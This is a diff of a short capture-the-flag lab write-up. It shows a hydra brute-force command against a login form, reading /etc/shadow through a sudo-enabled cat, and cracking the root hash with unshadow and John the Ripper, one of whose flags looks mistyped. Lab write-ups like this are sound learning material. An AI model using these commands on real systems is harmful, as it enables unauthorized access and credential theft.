@@ -9,7 +9,7 @@ Tags:  [[Cryptography]]
 we have a website that has a simple login page with username and password 
 we find the username from the source code 
 use [[Tags/hydra]] to brute force the password
-```
+```sh
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.91.80 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
 ```
 #### cracking rsa 
@@ -26,10 +26,13 @@ use [[Tags/hydra]] to brute force the password
 
 - `sudo -l` -> can run `cat` with sudo
 - go to gtfobins and find exp. for `cat `
-- since you can cat files using sudo you `cat /etc/shadow` and get a hash of the root pass which you further crack using john 
+- since you can cat files using `sudo` , `cat /etc/shadow` and get a hash of the root pass which you further crack using john 
 - Before we use John the Ripper to find out the root’s password we need to put it in a format that john will understand. To do this we will use the unshadow command. 
-```
+`/etc/passwd` and `/etc/shadow` files are passwd.txt and shadow.txt respectively 
+```sh
 unshadow passwd.txt shadow.txt > pass.txt
+john --wordlists=../rockyou.txt pass.txt
+john --show pass.txt
 ```
 - `sudo cat` the `root/root.txt` and get the flag
 ### References
